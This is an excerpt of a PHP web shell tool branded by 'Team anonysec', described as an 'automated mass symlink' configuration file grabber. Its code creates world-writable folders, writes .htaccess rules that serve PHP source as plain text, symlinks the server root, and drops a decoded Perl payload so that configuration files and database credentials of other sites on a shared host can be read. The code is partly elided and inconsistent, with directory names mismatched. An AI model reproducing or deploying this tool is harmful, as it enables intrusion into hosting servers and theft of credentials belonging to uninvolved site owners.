...
<title>--==[[Configuration File By Team anonysec.org]]==--</title>
...
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
       ...
       <td width="100%" align=center valign="top" rowspan="1">
           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Configuration</font><font color=white size=5 face="comic sans ms"><b>  File By</font><font color=green size=5 face="comic sans ms"><b> Team anonysec ]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=#ff9933> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font color=white>-==[[tnx:to]]==--</font><br> <font color=#ff9933>   ReZa CLONER  Sheikh Shahin  Moeein Seven .<br>

<font color=white>--==[[Dedicated to]]==--</font>
<br># My Father and my Ex Teacher  #<br><font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>Rednofozi :D</font><br><font color=#ff9933> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>
						
           </table>
       </table> <div align=center><font color=#ff9933 font size=5><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="30" width="70%"><span class="footerlink">love iranin hackers  anonysec.org.</span></marquee><br></font></div><div align=center><table><tr><td>Welcome :) .. Configuration file killer welcomes you _/\_ </font><br></td></tr></table>
...
<font color=white size=2 face="comic sans ms">automated mass symlinkD</font>
<form method=post>
...
?></textarea><br><br>
	<input type=submit name=su value="^_^ .. lets start" /></form>
	<?php } ?>
	<?php
	error_reporting(0);
	...
	if(isset($_POST['su']))
	{
	mkdir('rednofozi',0777);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$g = fopen('Indishell/.htaccess','w');
fwrite($g,$rr);
$indishell = symlink("/","anonysec/root");
		...
		$dir=mkdir('rednofozi',0777);
		$r  = " Options all \n DirectoryIndex ICA.html  \n   Require None \n Satisfy Any";
        $f = fopen('anonysec/.htaccess','w');
   
        fwrite($f,$r);
        $consym="<a href=rednofozi/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
...
fwrite ($pelfile,$decryp);
   ...
   echo "<font size=4>check in this directory for configuration files once you have done with this script<br><a href=perl/><u> :)</u></a></font>";
